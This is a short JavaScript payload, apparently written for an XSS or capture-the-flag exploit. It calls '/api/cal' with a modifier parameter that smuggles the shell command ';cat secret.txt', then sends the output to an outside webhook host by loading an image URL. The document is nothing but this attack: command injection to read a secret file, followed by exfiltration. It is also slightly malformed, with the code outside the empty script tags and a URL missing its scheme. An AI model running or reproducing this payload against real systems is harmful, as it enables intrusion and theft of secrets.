<script>
    
</script>
fetch('/api/cal?modifier=;cat secret.txt').then(response => response.text()).then(data => {
    var image = new Image();
    image.src = "5974a063-c2a8-4009-8b57-a04f8a165d36@emailhook.site/?data=" + encodeURIComponent(data);
})